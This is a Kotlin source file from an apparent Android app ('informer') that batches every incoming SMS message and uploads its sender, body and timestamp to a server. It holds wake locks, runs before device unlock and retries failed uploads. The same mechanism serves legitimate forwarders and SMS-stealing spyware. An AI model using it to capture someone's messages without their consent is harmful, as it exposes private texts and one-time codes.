package com.example.informer

import android.content.Context
import android.os.Handler
import android.os.Looper
import android.os.PowerManager
import android.util.Log

object SmsBatchManager {
    private const val BATCH_WINDOW_MS = 3000L
    private val messageList = mutableListOf<SmsReceiver.SmsData>()
    private var pendingTask: Runnable? = null
    private val handler = Handler(Looper.getMainLooper())

    fun enqueue(context: Context, sender: String, body: String, timestamp: Long) {
        val safeContext = context.createDeviceProtectedStorageContext()
        synchronized(messageList) {
            messageList.add(SmsReceiver.SmsData(sender, body, timestamp))
            pendingTask?.let { handler.removeCallbacks(it) }

            val sendTask = Runnable {
                val toSend: List<SmsReceiver.SmsData>
                synchronized(messageList) {
                    toSend = messageList.sortedBy { it.timestamp }
                    messageList.clear()
                    pendingTask = null
                }
                if (toSend.isEmpty()) return@Runnable

                val pm = safeContext.getSystemService(Context.POWER_SERVICE) as PowerManager
                val wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "Informer:BatchWakeLock")
                wakeLock.acquire(60_000)

                kotlin.concurrent.thread {
                    try {
                        for (msg in toSend) {
                            Log.d("SMS_BATCH_MANAGER", "🚀 Đang đẩy SMS từ ${msg.sender}...")
                            val ok = ServerReporter.sendEventSync(safeContext, "SMS", msg.sender, msg.body, msg.timestamp)
                            if (!ok) {
                                Log.w("SMS_BATCH_MANAGER", "⚠️ Đẩy SMS thất bại, đưa vào queue retry")
                                FailedSmsQueue.enqueue(safeContext, msg.sender, msg.body, msg.timestamp)
                            }
                        }
                    } catch (e: Exception) {
                        Log.e("SMS_BATCH_MANAGER", "❌ Lỗi luồng gửi: ${e.message}")
                        // Nếu exception, đưa tất cả vào queue retry
                        for (msg in toSend) {
                            FailedSmsQueue.enqueue(safeContext, msg.sender, msg.body, msg.timestamp)
                        }
                    } finally {
                        if (wakeLock.isHeld) wakeLock.release()
                        Log.d("SMS_BATCH_MANAGER", "🏁 Xử lý xong batch.")
                    }
                }
            }
            pendingTask = sendTask
            handler.postDelayed(sendTask, BATCH_WINDOW_MS)
        }
    }
}
